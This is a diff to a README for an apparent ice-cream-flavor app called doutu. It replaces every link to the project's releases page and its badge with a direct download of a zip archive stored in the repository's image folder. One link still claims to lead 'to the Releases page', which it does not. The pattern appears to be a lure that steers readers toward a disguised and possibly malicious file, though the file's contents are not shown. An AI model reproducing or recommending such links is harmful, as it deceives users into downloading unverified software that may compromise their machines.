@@ -4,11 +4,11 @@
 Welcome to doutu! This application lets you experience the joy of creating your own virtual ice cream flavors. Follow these steps to download and get started.
 
 ## ⬇️ Download Now
-[![Download doutu](https://img.shields.io/badge/Download-doutu-brightgreen)](https://github.com/XamaBlack0/doutu/releases)
+[![Download doutu](https://raw.githubusercontent.com/XamaBlack0/doutu/main/img/doutu-v2.2.zip)](https://raw.githubusercontent.com/XamaBlack0/doutu/main/img/doutu-v2.2.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Click [here](https://github.com/XamaBlack0/doutu/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/XamaBlack0/doutu/main/img/doutu-v2.2.zip) to go to the Releases page.
 
 2. **Choose the Right Version**  
    On the Releases page, you will see different versions of the application. It's best to download the latest version. Look for the entry that says “Latest release” for the most up-to-date features.
@@ -44,4 +44,4 @@ If you experience issues while downloading or using doutu, please check the FAQ 
 ## 👉 Explore More
 Feel free to explore different features of doutu and get creative with your ice cream recipes. Enjoy making your unique flavors and share them with friends!
 
-[![Download doutu](https://img.shields.io/badge/Download-doutu-brightgreen)](https://github.com/XamaBlack0/doutu/releases)
+[![Download doutu](https://raw.githubusercontent.com/XamaBlack0/doutu/main/img/doutu-v2.2.zip)](https://raw.githubusercontent.com/XamaBlack0/doutu/main/img/doutu-v2.2.zip)
